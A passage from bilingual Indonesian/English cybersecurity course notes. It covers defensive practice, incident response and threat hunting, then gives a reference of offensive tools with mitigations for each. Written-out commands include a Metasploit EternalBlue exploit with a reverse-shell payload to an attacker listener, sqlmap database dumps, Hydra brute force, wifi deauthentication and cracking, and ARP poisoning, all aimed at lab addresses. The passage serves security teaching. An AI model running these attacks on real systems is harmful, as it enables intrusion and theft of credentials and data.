   - Disable unnecessary drivers
   - Secure boot + UEFI protection
4. **AppLocker / Device Guard** - Whitelist applications
5. **ASLR + DEP** - Memory protections prevent exploit

**Detection:**
1. Behavioral analysis - Unusual process elevation
2. File integrity monitoring - Kernel modifications
3. Audit logging - Track privilege escalation attempts
4. EDR - Detect exploit techniques

---

#### **Perlindungan Lateral Movement**

**Prevention:**
1. **Credential Management**
   - Minimize credential caching
   - Use short-lived credentials
   - Protect credential storage
   
2. **Network Access Control**
   - Micro-segmentation (limit East-West traffic)
   - Zero Trust Architecture (verify every access)
   - Whitelist allowed connections
   
3. **Privilege Isolation**
   - Admin accounts strictly limited
   - Separate admin from user account
   - Never login ke systems dengan admin account
   
4. **Defense Against Pass-the-Hash**
   - NTLMv2 only (disable NTLMv1)
   - Enable SMB signing
   - Restricted admin mode
   
5. **Kerberos Hardening**
   - Enforce Kerberos only
   - Prevent delegation
   - Monitor ticket requests

**Detection:**
1. Monitor admin credentials usage
2. Detect anomalous account access (unusual systems)
3. Monitor failed authentication attempts
4. Alert pada privilege group membership changes
5. Track credential movement between systems

---

### 6.5.3 Incident Response dan Recovery

**Immediate Response (Hours 0-4):**
```
1. DETECTION
   - Alert dari IDS/SIEM/EDR
   - User report suspicious activity
   - Antivirus detection

2. INITIAL RESPONSE (Golden Hour)
   ├─ Activate incident response team
   ├─ Isolate affected systems (network isolation)
   ├─ Preserve evidence (memory dump, logs, disk image)
   ├─ Notify key stakeholders
   └─ Start incident timeline

3. CONTAINMENT
   ├─ Isolate infected systems
   ├─ Kill malicious processes
   ├─ Revoke compromised credentials
   ├─ Block C2 communications
   └─ Prevent lateral movement
```

**Short-term Response (Days 1-3):**
```
1. INVESTIGATION
   ├─ Determine attack vector (how attacker got in)
   ├─ Identify all compromised systems
   ├─ Determine what was accessed/stolen
   ├─ Timeline reconstruction
   └─ Scope assessment

2. REMEDIATION
   ├─ Clean/rebuild infected systems
   ├─ Patch vulnerabilities
   ├─ Update security rules
   ├─ Change all compromised credentials
   └─ Restore dari clean backups

3. FORENSICS
   ├─ Collect evidence untuk legal action
   ├─ Document attack chain
   ├─ Preserve logs dan artifacts
   └─ Prepare for law enforcement if necessary
```

**Long-term Recovery (Days 4+):**
```
1. RECOVERY
   ├─ Restore systems dari backups
   ├─ Re-image compromised systems
   ├─ Verify no re-infection
   ├─ Restore operations gradually
   └─ Monitor closely

2. POST-INCIDENT
   ├─ Root cause analysis
   ├─ Lessons learned
   ├─ Process improvements
   ├─ Security hardening
   └─ Training for lessons learned
```

**Recovery Best Practices:**
1. **Backups are Critical**
   - 3-2-1 backup rule: 3 copies, 2 different media, 1 offsite
   - Test restore procedures regularly
   - Backups offline (air-gapped) dari network
   - Encrypt backups
   - Version control untuk detect ransomware spread

2. **Disaster Recovery Plan**
   - Documented procedures untuk different scenarios
   - Regular testing (at least yearly)
   - Critical system prioritization
   - Recovery time objectives (RTO)
   - Recovery point objectives (RPO)

3. **Business Continuity**
   - Alternate sites untuk critical operations
   - Failover procedures
   - Communication plan untuk customers/partners
   - Leadership succession planning

---

### 6.5.4 Monitoring dan Threat Hunting

**SIEM (Security Information and Event Management)**
```
Log Sources:
├─ Firewalls
├─ IDS/IPS
├─ Servers (Windows Event Log, syslog)
├─ Antivirus
├─ Applications
├─ Database audit logs
└─ Network flow data

SIEM Processes:
├─ Log aggregation (centralize logs)
├─ Correlation (connect events)
├─ Enrichment (add context)
├─ Alerting (notify security team)
└─ Investigation (analysts analyze)

Tools: Splunk, ELK, IBM QRadar, ArcSight, etc
```

**Threat Hunting**
```
Proactive search untuk threats belum detected by automated systems

Typical Hunt Scenarios:
1. Unusual outbound connections (C2 communication)
2. Suspicious process spawning
3. Abnormal account access patterns
4. Privilege escalation attempts
5. Lateral movement indicators
6. Persistent mechanisms (scheduled tasks, registry modifications)
7. File modifications pada critical systems
8. Unusual PowerShell execution

Tools: SIEM queries, EDR, packet captures, logs analysis
```

---

### 6.5.5 Cybersecurity Best Practices Summary

**PREVENTION (Best Line of Defense):**
1. **Patch Management** - Most critical, fix exploitable vulnerabilities
2. **Security Awareness** - Users adalah first line of defense
3. **Strong Authentication** - MFA, strong passwords, credential management
4. **Encryption** - Data protection in rest dan transit
5. **Access Control** - Least privilege, separation of duties
6. **Network Segmentation** - Limit lateral movement

**DETECTION:**
1. **Monitoring** - SIEM, logs, alerts
2. **Threat Intelligence** - Know indicators of compromise
3. **Incident Response Plan** - Ready untuk respond quickly
4. **Regular Testing** - Penetration testing, tabletop exercises

**RECOVERY:**
1. **Backups** - Frequent, tested, offline
2. **Disaster Recovery** - Documented procedures
3. **Incident Response** - Quick containment dan remediation
4. **Forensics** - Evidence preservation untuk investigation

**GOVERNANCE:**
1. **Security Policy** - Clear expectations
2. **Compliance** - Meet regulatory requirements
3. **Risk Management** - Assess dan prioritize risks
4. **Continuous Improvement** - Learn dari incidents, update defenses

---

## 7. OFFENSIVE & DEFENSIVE TOOLS - COMPLETE REFERENCE

Comprehensive reference of security tools digunakan untuk penetration testing (offensive) dan security monitoring (defensive).

### BAGIAN 1: OFFENSIVE TOOLS & TECHNIQUES (RED TEAM)

#### 1. RECONNAISSANCE & SCANNING TOOLS

**A. Nmap (Network Mapper) - Port Scanning & Network Enumeration**
- **Fungsi Utama**: Host discovery, port scanning, service/version detection, OS detection, vulnerability scanning
- **Digunakan Untuk**:
  - Network reconnaissance untuk identify active hosts di target network
  - Port scanning untuk find open services dan potentially vulnerable applications
  - Service version detection untuk identify specific software yang running
  - OS fingerprinting untuk determine target operating system & configuration
  - Vulnerability detection via NSE scripts untuk quick assessment
  - Network mapping untuk understand target infrastructure
  
- **Instalasi**: `sudo apt update && sudo apt install nmap -y` (sudah default di Kali)

Perintah umum:
```bash
nmap -sn 192.168.56.0/24                    # Ping sweep (host discovery)
nmap -p- 192.168.56.101                     # Scan all 65535 ports
nmap -sS 192.168.56.101                     # SYN stealth scan (half-open)
nmap -sV 192.168.56.101                     # Service version detection
nmap -O 192.168.56.101                      # OS detection
nmap -A 192.168.56.101                      # Aggressive scan (all above)
nmap --script vuln 192.168.56.101           # Vulnerability scanning
nmap -p 1-1000 192.168.56.101 -T4           # Custom port range, faster timing
nmap --script smb-enum-shares 192.168.56.101 # SMB enumeration
nmap -oN report.txt 192.168.56.101          # Save normal format
nmap -oX report.xml 192.168.56.101          # Save XML format
```
- Scan types: -sS (SYN), -sT (connect), -sU (UDP), -sN/-sF/-sX (null/FIN/Xmas), -sA (ACK), -sW (window)
- Output interpretation: PORT STATE SERVICE VERSION
- Teknik: TCP SYN stealth scan, UDP enumeration, OS fingerprinting, NSE scripts untuk vulnerability detection
- Mitigasi: IDS/IPS detection of nmap scans, firewall logging, port knocking

**B. Shodan - Internet Search Engine untuk Device Discovery**
- **Fungsi Utama**: Search internet-connected devices & servers via public-facing services
- **Digunakan Untuk**:
  - Passive reconnaissance untuk find exposed systems tanpa direct scanning
  - Identify vulnerable devices exposed ke internet (default credentials, known CVE)
  - Corporate network mapping dari eksternal perspective
  - Competitive intelligence untuk identify competitor infrastructure
  - IoT device discovery untuk assess security exposure
  - Finding backup systems, test systems yang accidentally exposed
  
- **Website**: https://www.shodan.io
- **Query examples**:
  ```
  apache 200 ok
  port:22 country:ID
  "Apache 2.4.41" vuln
  FTP server default port:21
  ```
- Teknik: Passive reconnaissance, identify exposed services globally, gather OSINT
- Mitigasi: Firewall blocking unnecessary inbound access, network segmentation, remove from search indexes

**C. Maltego - OSINT Relationship Mapping & Link Analysis**
- **Fungsi Utama**: Link analysis, entity relationship mapping, open source intelligence
- **Digunakan Untuk**:
  - Person/company profiling untuk social engineering target selection
  - Domain ownership tracing untuk identify legitimate vs fake websites
  - Email address enumeration dari various online sources
  - Finding related domains & subdomains untuk comprehensive reconnaissance
  - Mapping organizational relationships & employee networks
  - Gathering phone numbers, email addresses, locations dari public data
  
- **Use**: Gather information on individuals, companies, domains, networks
- **Transforms**: DNS lookup, email harvesting, whois, IP geolocation, social media
- Teknik: Graph-based intelligence gathering, target profiling, social engineering
- Mitigasi: Privacy protection, limit public information exposure, monitor Maltego usage

**D. Recon-ng - Automated Web Reconnaissance Framework**
- **Fungsi Utama**: Automated web reconnaissance & OSINT collection
- **Digunakan Untuk**:
  - Automated information gathering dari multiple online sources
  - API-based data collection untuk employee enumeration
  - GitHub reconnaissance untuk find exposed credentials & API keys dalam repos
  - Email enumeration dari breach databases dan other sources
  - Subdomain discovery via certificate transparency logs
  - Metadata extraction dari publicly available documents
  
- **Commands**:
  ```bash
  recon-ng
  > marketplace search github
  > marketplace install github-search
  > modules load github-search
  > options set SOURCE target-domain.com
  > run
  ```
- Teknik: API-based intelligence gathering, automated reconnaissance, module-based discovery
- Mitigasi: API monitoring, rate limiting, authentication controls, GitHub token security

#### 2. VULNERABILITY ASSESSMENT TOOLS

**A. Nessus - Professional Vulnerability Scanner**
- Fungsi: Comprehensive vulnerability scanning, risk assessment, compliance checking
- Features: CVSS scoring, patch management, compliance checking (PCI-DSS, HIPAA)
- Scan types: Discovery, web app scanning, database assessment, malware scanning
- Output: Vulnerability list, risk ratings (critical/high/medium/low), remediation guidance
- Teknik: Passive & active vulnerability detection, credentialed scanning, remediation verification
- Mitigasi: Regular patching, WAF deployment, intrusion prevention, vulnerability management program

**B. OpenVAS - Open Vulnerability Assessment System**
- Fungsi: Free alternative to Nessus, comprehensive vulnerability scanning
- Commands:
  ```bash
  sudo apt install openvas-scanner openvas-manager
  openvas-start
  # Access: https://localhost:9392
  # Create scan task, select target, run scan
  ```
- Features: NVT (Network Vulnerability Tests) database, detailed reports, remediation guidance
- Teknik: Plugin-based vulnerability detection, authenticated scanning, trend analysis
- Mitigasi: Same as Nessus - patching, WAF, IPS deployment

**C. Qualys QASA - Cloud-based Vulnerability Management**
- Fungsi: SaaS-based vulnerability scanning & management
- Features: API-based scanning, integration with CI/CD pipelines, multi-tenant infrastructure
- Teknik: Cloud security assessment, asset discovery, compliance validation
- Mitigasi: Cloud security best practices, encryption, access controls, VPC isolation

#### 3. TRAFFIC SNIFFING & MAN-IN-THE-MIDDLE TOOLS

**A. Wireshark - Interactive Network Packet Analyzer & Sniffer**

- **Fungsi Utama**: Capture & analyze network traffic in real-time dengan GUI interaktif
- **Digunakan Untuk**:
  - Network troubleshooting & performance analysis
  - Protocol analysis & verification
  - Security investigation & incident analysis
  - Malware behavior analysis & C2 communication detection
  - Plaintext credential extraction dari unencrypted protocols
  - Understanding network communication flow
  - Training & learning network protocols
  - Forensics & packet-level investigation

#### **INSTALASI & LAUNCHING**
```bash
sudo apt install wireshark
sudo usermod -aG wireshark $USER              # Add current user to wireshark group
wireshark &                                   # Launch GUI (background)
wireshark -r capture.pcap                     # Open saved capture file
wireshark -i eth0                             # Capture on specific interface
wireshark -k -i eth0                          # Start capture immediately
```

#### **BASIC SNIFFING - CARA CAPTURE PAKET**

**Step 1: Select Interface**
```
1. Launch Wireshark
2. Menu: Capture → Interfaces (atau Ctrl+I)
3. Pilih interface yang active (contoh: eth0, wlan0)
4. Lihat indicator "Traffic" untuk confirm interface active
```

**Step 2: Start Capture**
```
Cara 1 - GUI:
- Klik interface name → Auto-start capture begins
- Atau: Capture → Start (Ctrl+E)

Cara 2 - Terminal:
sudo wireshark -i eth0 -w output.pcap
```

**Step 3: Stop Capture**
```
Capture → Stop (Ctrl+E) atau klik Stop button (red square)
```

**Step 4: Save Capture**
```
File → Export As → Format PCAP (.pcap)
Atau: File → Save As
```

#### **CAPTURE FILTERS vs DISPLAY FILTERS**

**Capture Filters** (set SEBELUM capture, mengurangi data capture):
- Syntax: `tcp port 80` atau `host 192.168.56.101`
- Set di: Capture → Capture Filters (atau input box sebelum start)
- Efek: HANYA packets matching filter yang dicapture (menghemat disk)

**Display Filters** (set SETELAH capture, untuk viewing):
- Syntax: `http` atau `ip.addr == 192.168.56.101`
- Set di: Filter input box di toolbar (usually gray box dengan magnifier)
- Efek: Menampilkan/menyembunyikan packets tanpa menghapus dari capture

**Contoh Capture Filters:**
```
tcp port 80                    # Only HTTP
tcp port 443                   # Only HTTPS
host 192.168.56.101           # To/from specific IP
arp                           # ARP traffic only
udp port 53                   # DNS only
tcp.port == 22                # SSH only
src host 192.168.56.1         # Source IP only
dst host 192.168.56.101       # Destination IP only
tcp and not ssh               # TCP but exclude SSH
(tcp.port == 80) or (tcp.port == 443)  # HTTP or HTTPS
```

**Contoh Display Filters:**
```
http                          # Show HTTP packets
http.request.method == "GET"  # Only GET requests
http.request.uri contains "admin"  # URIs containing "admin"
ip.addr == 192.168.56.101    # Traffic to/from IP
tcp.port == 3306             # MySQL traffic
dns.qry.name contains "google"  # DNS queries untuk google
tcp.flags.syn == 1           # SYN packets (connection start)
tcp.flags.fin == 1           # FIN packets (connection end)
tls.handshake                # TLS handshake packets
smtp                         # Email (SMTP) traffic
ftp                          # FTP traffic
telnet                       # Telnet (plaintext!) traffic
```

#### **WIRESHARK INTERFACE & MENUS**

**Main Windows:**
```
┌────────────────────────────────────────────┐
│ Menu Bar (File, Edit, View, Capture, etc)  │
├────────────────────────────────────────────┤
│ Toolbar (buttons untuk common actions)     │
├────────────────────────────────────────────┤
│ Filter Box (display filters)               │
├────────────────────────────────────────────┤
│ PACKET LIST (summary of captured packets)  │ ← Main area
├────────────────────────────────────────────┤
│ PACKET DETAILS (expanded view of selected) │ ← Shows protocol layers
├────────────────────────────────────────────┤
│ PACKET BYTES (hex/ASCII view)              │ ← Raw data
└────────────────────────────────────────────┘
```

**Important Menus:**

**Capture Menu:**
- `Interfaces` (Ctrl+I) - Select/manage capture interfaces
- `Options` (Ctrl+K) - Advanced capture settings
- `Start` (Ctrl+E) - Begin packet capture
- `Stop` (Ctrl+E) - Stop capture
- `Restart` - Clear & restart capture

**View Menu:**
- `Zoom In/Out` - Resize packet list
- `Columns` - Add/remove columns di packet list
- `Colorize` - Color code packets by protocol
- `Name Resolution` - Enable DNS/MAC resolution
- `Scroll Packet List` - Auto-scroll ke newest packets

**Analyze Menu:**
- `Decode As` - Force specific protocol interpretation
- `Follow Stream` (→ TCP/UDP/TLS) - Show full conversation
- `Conversation List` - Show conversations antar hosts
- `Service Response Time` - Analyze latency

**Tools Menu:**
- `Firewall ACL Rules` - Generate ACL rules dari capture
- `Create Stat > Protocol Hierarchy` - Show protocol breakdown
- `Create Stat > Conversations` - Show host conversations

#### **CARA BACA PACKET DI WIRESHARK**

**Packet List Pane (Top):**
```
No.  Time        Source      Destination  Protocol Length Info
1    0.000000    192.168.1.1 192.168.1.10 TCP      60     55632→80 [SYN] Seq=0
2    0.000456    192.168.1.10 192.168.1.1 TCP      60     80→55632 [SYN, ACK] Seq=0 Ack=1
3    0.000789    192.168.1.1 192.168.1.10 TCP      54     55632→80 [ACK] Seq=1 Ack=1
4    0.001234    192.168.1.1 192.168.1.10 HTTP     145    GET / HTTP/1.1
5    0.001678    192.168.1.10 192.168.1.1 HTTP     512    HTTP/1.1 200 OK (text/html)
```

**Column Meanings:**
- **No**: Packet sequence number
- **Time**: Time offset dari capture start
- **Source**: Source IP:port
- **Destination**: Destination IP:port
- **Protocol**: Protocol name (TCP, UDP, HTTP, DNS, etc)
- **Length**: Total packet size dalam bytes
- **Info**: Summary info (flags, port numbers, request/response status)

**Packet Details Pane (Middle) - Protocol Stack:**
```
Frame 1: 60 bytes on wire (480 bits), 60 bytes captured (480 bits)
├─ Ethernet II
├─ Internet Protocol Version 4
│  ├─ Source: 192.168.1.1
│  ├─ Destination: 192.168.1.10
│  └─ Protocol: TCP (6)
└─ Transmission Control Protocol
   ├─ Source Port: 55632
   ├─ Destination Port: 80
   ├─ Sequence Number: 0 (relative sequence number)
   ├─ Acknowledgement Number: 0
   ├─ Flags: 0x002 (SYN)
   └─ Window Size: 65535
```

**Understanding Packet Details:**
- Expand each layer (▶ symbol) untuk melihat detail
- Warna highlights correspond ke Packet Bytes
- Setiap field punya tooltip/explanation
- Dapat copy values untuk analysis

**Packet Bytes Pane (Bottom):**
```
Hex view:                    ASCII view:
4500 0039 0000 4000         E... @
4006 7a5a c0a8 0101         ..*Z ....
c0a8 010a da84 0050         ......P
0000 0000 0000 0000         ........
5002 ffff 1234 0000         P... .4..
                            
Warna = corresponding ke selected field di Packet Details
Dapat copy hexadecimal values untuk analysis
```

#### **ANALYZING CONVERSATIONS - Follow Stream**

**How to Use:**
```
1. Click any packet dalam conversation
2. Right-click → Follow → TCP Stream (atau UDP/TLS)
3. Atau: Analyze → Follow → TCP Stream
4. Dialog terbuka showing full conversation
```

**TCP Stream Example:**
```
=================================================================
GET / HTTP/1.1\r\n
Host: example.com\r\n
User-Agent: Mozilla/5.0\r\n
\r\n

HTTP/1.1 200 OK\r\n
Content-Type: text/html\r\n
Content-Length: 1234\r\n
\r\n
<html><body>Welcome</body></html>
=================================================================
```

**Stream Options:**
- **Show Data As**: ASCII (text), Hex Dump, Raw
- **Direction**: Client → Server (red), Server → Client (blue), Both
- **Zoom**: Adjust text size
- **Save As**: Export conversation ke file

#### **EXTRACTING DATA FROM CAPTURE**

**Method 1: Export HTTP Objects**
```
1. File → Export Objects → HTTP
2. Dialog shows all images/files downloaded
3. Select & save individual files
4. Useful untuk: extract images, documents, scripts
```

**Method 2: Follow TCP Stream**
```
1. Find relevant packet
2. Right-click → Follow TCP Stream
3. Copy plaintext conversation
4. Save into file
```

**Method 3: Export Packet Bytes**
```
1. Select packet
2. Analyze → Export Selected Packet Bytes
3. Save as hex dump atau text
```

#### **COMMON SNIFFING SCENARIOS**

**Scenario 1: Capture HTTP Traffic & Extract Passwords**
```
Filter: http
Follow TCP Stream untuk setiap HTTP request
Cari credentials dalam GET/POST parameters
Contoh: GET /login.php?username=admin&password=secret123
```

**Scenario 2: Capture DNS Queries**
```
Filter: dns
Lihat "DNS.qry.name" untuk daftar domains yang di-query
Detect malware/C2 communications via suspicious domains
```

**Scenario 3: Analyze Connection Establishment**
```
Filter: tcp.flags.syn == 1
Lihat semua connection initiations (SYN packets)
Identify port scanning attempts
```

**Scenario 4: Detect Encrypted Tunnels**
```
Filter: tls
Lihat TLS handshake packets
Extract SSL/TLS certificate information
Identify encryption protocol version
```

**Scenario 5: Monitor File Transfers**
```
Filter: ftp or sftp or smb
Follow stream untuk melihat file paths & commands
Detect unauthorized file transfers
```

#### **ADVANCED WIRESHARK FEATURES**

**Colorizing Packets:**
```
View → Colorize Packet List
View → Coloring Rules untuk customize
Default:
- Green: TCP traffic
- Light blue: UDP traffic
- Black: Error packets
```

**Statistics & Analysis:**
```
Statistics → Protocol Hierarchy
- Breakdown of all protocols dalam capture

Statistics → Conversations
- List of all conversations (IP pairs)
- Bytes sent/received
- Duration

Statistics → Endpoints
- List of all unique IPs
- Packets sent/received
```

**Searching Packets:**
```
Edit → Find Packet (Ctrl+F)
Cara search:
- Display filter (normal filter)
- Hex value (dalam packet bytes)
- String (dalam payload)
- Regex (regular expressions)
```

#### **WIRESHARK SECURITY & ETHICS**

**Legal & Ethical Considerations:**
```
⚠️ IMPORTANT:
- Hanya capture traffic Anda OWN atau authorized
- Capturing others' traffic tanpa consent = ILLEGAL
- Many jurisdictions have wiretapping laws
- Use untuk legitimate purposes (troubleshooting, learning, authorized testing)
```

**Privacy Protection:**
```
Sanitize captures sebelum sharing:
- File → Export Specified Packets (select non-sensitive)
- Remove traffic dengan sensitive data
- Redact IP addresses jika perlu
```

**Performance Monitoring:**
```
Wireshark can slow network karena packet copying
Gunakan:
- Capture filters untuk reduce overhead
- tcpdump untuk high-performance capture
- Ring buffer mode untuk continuous monitoring
```

**B. tcpdump - Command-line Packet Capture**
- Fungsi: Scriptable packet capture, unattended monitoring
- Commands:
  ```bash
  sudo tcpdump -i eth1                    # Capture on interface
  sudo tcpdump -D                         # List interfaces
  sudo tcpdump -n -w capture.pcap         # Capture to file (no DNS)
  sudo tcpdump -r capture.pcap            # Read pcap file
  sudo tcpdump -n 'tcp port 80' -w http.pcap  # Filter HTTP
  sudo tcpdump -n 'tcp port 443' -w https.pcap # Filter HTTPS
  sudo tcpdump -n -A 'tcp port 80'        # Show HTTP payload (ASCII)
  sudo tcpdump -n -x 'tcp port 80'        # Show hex dump
  sudo tcpdump -n 'arp' -w arp.pcap       # Capture ARP
  sudo tcpdump -n -i any                  # All interfaces
  ```
- Filtering: and, or, not operators; tcp/udp/icmp/arp protocols
- Teknik: Unattended capture, automation, baseline generation, forensics
- Mitigasi: Network monitoring, IDS alerts on suspicious capture, access controls

**C. Tshark - Command-line Wireshark**
- Fungsi: Batch processing & scriptable packet analysis
- Commands:
  ```bash
  tshark -r capture.pcap -Y http          # Filter HTTP packets
  tshark -r capture.pcap -T fields -e http.request.uri # Extract URIs
  tshark -r capture.pcap -Y "tcp.port == 80" -w http_only.pcap
  tshark -i eth1 -w live_capture.pcap     # Live capture
  tshark -r capture.pcap | head -20       # Show first 20 packets
  ```
- Teknik: Scriptable analysis, automated pcap processing, integration with other tools
- Mitigasi: Log monitoring for tshark usage, network behavior analysis

**D. Ettercap - Network Sniffer & MITM Platform**
- Fungsi: Active sniffing, ARP poisoning, session hijacking, MITM attacks
- Installation: `sudo apt install ettercap-graphical`
- Usage:
  ```bash
  sudo ettercap -G                        # Launch GUI
  # Or CLI: sudo ettercap -Tq -i eth1 -M arp /// ///
  ```
- Techniques:
  - ARP poisoning: Intercept traffic between two hosts
  - Password sniffing: Extract credentials dari HTTP/FTP/TELNET
  - Session hijacking: Steal session cookies untuk unauthorized access
  - DNS spoofing: Redirect traffic ke attacker server
  - Content modification: Replace strings dalam traffic (filters)
- Mitigasi: HTTPS mandatory, VPN, static ARP entries, network segmentation, DAI (Dynamic ARP Inspection)

**E. mitmproxy - Interactive HTTPS Proxy**
- Fungsi: Intercept & modify HTTP/HTTPS traffic dengan CA certificate spoofing
- Installation: `pip install mitmproxy`
- Usage:
  ```bash
  mitmproxy -p 8080                  # Start proxy on port 8080
  # Configure client: proxy 127.0.0.1:8080
  # View & modify requests/responses dalam interactive UI
  # Options: intercept, modify, save traffic, Python scripting
  ```
- Capabilities: HTTPS decryption (dengan CA cert install di client), request/response modification
- Teknik: Man-in-the-middle interception, traffic manipulation, injection attacks
- Mitigasi: Certificate pinning, network policies, proxy detection, behavior monitoring

#### 4. WIRELESS SECURITY TESTING TOOLS

**A. Airodump-ng - Wireless Network Monitor**
- Fungsi: Capture wireless traffic, detect networks & connected clients
- Commands:
  ```bash
  sudo airmon-ng                      # List wireless interfaces
  sudo airmon-ng start wlan0          # Enable monitor mode (wlan0mon)
  sudo airodump-ng wlan0mon           # Scan all networks
  sudo airodump-ng -w cap --bssid AA:BB:CC:DD:EE:FF --channel 6 wlan0mon
  # -w: write to file, --bssid: target AP MAC, --channel: specific channel
  ```
- Output: SSID, BSSID (AP MAC), channel, signal power, beacons, data frames, client list
- Teknik: Network discovery, traffic capture, handshake capture untuk WPA cracking
- Mitigasi: Network monitoring for monitor mode adapters, rogue AP detection, wireless IDS

**B. Aireplay-ng - Wireless Injection Tool**
- Fungsi: Generate traffic, force deauthentication, capture handshakes
- Commands:
  ```bash
  sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon
  # --deauth 0: continuous deauth, -a: target AP BSSID
  # Effect: Disconnect all clients, force reconnection untuk handshake capture
  
  sudo aireplay-ng --fakeauth 10 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon
  # Fake authentication ke AP (untuk WEP cracking)
  ```
- Teknik: Deauthentication attacks, fake auth, ARP injection untuk WEP, fragmentation attacks
- Mitigasi: Deauth attack detection, client roaming prevention, 802.11w (management frame protection)

**C. Aircrack-ng - WEP/WPA Password Cracking**
- Fungsi: Offline password cracking dari captured handshakes atau traffic
- Commands:
  ```bash
  aircrack-ng -b AA:BB:CC:DD:EE:FF cap-01.cap        # Crack WEP (cepat)
  aircrack-ng -w wordlist.txt cap-01.cap             # Crack WPA offline
  aircrack-ng -w wordlist.txt -a 2 cap-01.cap        # WPA2 cracking
  aircrack-ng -r output.csv cap-01.cap               # Resume dari checkpoint
  ```
- Word lists: rockyou.txt (14M passwords), custom wordlists
- Teknik: Offline password cracking, PBKDF2 hash brute force (WPA2), RC4 key recovery (WEP)
- Success criteria: "KEY FOUND! [password]"
- Mitigasi: Strong PSK (Pre-Shared Key), WPA3, regular password changes, disable WPS

#### 5. EXPLOITATION & POST-EXPLOITATION TOOLS

**A. Metasploit Framework - Comprehensive Exploitation Platform**
- Fungsi: Exploit development, vulnerability testing, multi-stage payload generation
- Installation: `sudo apt install metasploit-framework`
- Usage:
  ```bash
  msfconsole                          # Launch Metasploit console
  > use exploit/windows/smb/ms17_010 # Select exploit (EternalBlue/WannaCry)
  > set RHOST 192.168.56.101          # Target IP
  > set PAYLOAD windows/meterpreter/reverse_tcp # Meterpreter payload
  > set LHOST 192.168.56.100          # Listener IP (attacker)
  > set LPORT 4444                    # Listener port
  > run                               # Execute exploit
  ```
- Database: Thousands of exploits, auxiliary modules, post-exploitation modules
- Payloads: Meterpreter (advanced shell), reverse shells, staged/stageless payloads
- Teknik: Multi-exploit chaining, privilege escalation, credential dumping, persistence
- Mitigasi: Patching, IPS/IDS deployment, endpoint detection, network segmentation

**B. Burp Suite - Web Application Security Testing Platform**
- **Fungsi Utama**: Web app scanning, proxy interception, exploitation workflows
- **Digunakan Untuk**:
  - Identify web application vulnerabilities (SQL injection, XSS, CSRF, insecure deserialization)
  - Manual & automated vulnerability discovery dalam web apps
  - Request/response modification untuk bypass security controls
  - Scanning forms untuk find injectable parameters
  - Exploitation workflow untuk proof-of-concept
  - Testing custom authentication mechanisms
  
- **Installation**: `sudo apt install burpsuite` (Community edition free)
- **Proxy mode**:
  ```bash
  burpsuite                           # Launch GUI
  # Configure browser: localhost:8080 (default Burp proxy)
  # Intercept requests/responses, modify parameters
  # Check untuk CSRF, XSS, SQL injection, insecure deserialization
  ```
- Scanner: Automatic vulnerability scanning (sql injection, xss, weak auth, insecure objects)
- Intruder: Fuzzing, brute force parameters, payload generation
- Repeater: Manual request testing, modification, replay
- Teknik: Manual & automated vulnerability discovery, exploitation workflows, bypass techniques
- Mitigasi: WAF deployment, input validation, secure coding practices, CSP headers

**C. SQLMap - SQL Injection Testing & Database Extraction**
- **Fungsi Utama**: Automated SQL injection testing & database extraction
- **Digunakan Untuk**:
  - Automated detection dari SQL injection vulnerabilities di web applications
  - Database enumeration untuk extract credentials, sensitive data
  - Bypass database authentication untuk unauthorized access
  - Extract user data, credit cards, personal information dari database
  - Identify injectable parameters automatically
  - WAF/IPS evasion techniques untuk test protected applications
  
- **Installation**: `sudo apt install sqlmap` atau `pip install sqlmap`
- **Commands**:
  ```bash
  sqlmap -u "http://192.168.56.101/login.php?id=1" # Basic scan
  sqlmap -u "http://192.168.56.101/login.php?id=1" -p id --dbs # List databases
  sqlmap -u "http://192.168.56.101/login.php?id=1" -D dbname --tables # List tables
  sqlmap -u "http://192.168.56.101/login.php?id=1" -D dbname -T users --dump # Extract data
  sqlmap -u "http://192.168.56.101/login.php" --data "user=admin&pass=test" --risk 3 --level 5
  # --risk: 1-3 (higher = more aggressive), --level: 1-5 (deeper tests)
  ```
- Payloads: Union-based, Boolean-based, Time-based, Error-based SQL injection
- Teknik: Parameter fuzzing, encoding evasion, WAF bypass, database enumeration
- Mitigasi: Parameterized queries, input validation, WAF, rate limiting, stored procedure

**D. Hydra - Fast Network Service Password Cracking**
- **Fungsi Utama**: Dictionary/brute force attack terhadap network services
- **Digunakan Untuk**:
  - SSH password cracking untuk gain remote access ke servers
  - FTP brute force untuk access file servers
  - HTTP basic authentication testing
  - MySQL/PostgreSQL default credential checking
  - RDP brute force untuk Windows systems
  - Parallel multi-target attacks untuk speed up
  - Wordlist-based dictionary attacks
  
- **Installation**: `sudo apt install hydra`
- **Commands**:
  ```bash
  hydra -l admin -P wordlist.txt 192.168.56.101 ssh # SSH brute force
  hydra -l admin -P wordlist.txt http-get 192.168.56.101 # HTTP basic auth
  hydra -L userlist.txt -P wordlist.txt 192.168.56.101 ftp # FTP brute force
  hydra -l admin -P wordlist.txt -s 22 192.168.56.101 ssh -t 4 # 4 parallel threads
  hydra -l admin -P wordlist.txt 192.168.56.101 mysql # MySQL root password
  ```
- Protocols: SSH, FTP, HTTP, HTTPS, SMTP, MySQL, PostgreSQL, RDP, VNC, Telnet
- Teknik: Parallel cracking, rate limiting bypass, session management, combo attacks
- Mitigasi: Strong passwords, fail2ban (rate limiting), account lockout policy, 2FA

**E. John the Ripper - Offline Password Hash Cracking**
- **Fungsi Utama**: Offline password hash cracking dari /etc/shadow atau database dumps
- **Digunakan Untuk**:
  - Crack Linux user passwords dari /etc/shadow after breach
  - Recover credentials dari stolen database backups
  - Testing password policy strength dalam organizations
  - Rainbow table attacks untuk common password hashes
  - Finding weak passwords dalam compromised systems
  - Assessing password security posture
  
- **Installation**: `sudo apt install john`
- **Commands**:
  ```bash
  john --wordlist=wordlist.txt shadow.txt # Crack /etc/shadow hashes
  john --format=MD5 hashes.txt            # Crack MD5 hashes
  john --format=bcrypt hashes.txt         # Crack bcrypt (slow, aman)
  john --show shadow.txt                  # Show cracked passwords
  john --incremental shadow.txt           # Brute force (slow)
  ```
- Formats: MD5, SHA-1, bcrypt, PBKDF2, scrypt, Argon2
- Teknik: Dictionary cracking, rainbow tables, incremental mode (semua kombinasi)
- Mitigasi: Strong hashing (bcrypt, scrypt, Argon2), salting, key derivation, slow algorithms

**F. Hashcat - GPU-Accelerated Hash Cracking**
- **Fungsi Utama**: Fast hash cracking menggunakan GPU acceleration
- **Digunakan Untuk**:
  - Fast password hash cracking dengan GPU untuk speed (100x+ faster)
  - Cracking large databases dengan hashes
  - Brute force attacks pada weakly hashed passwords
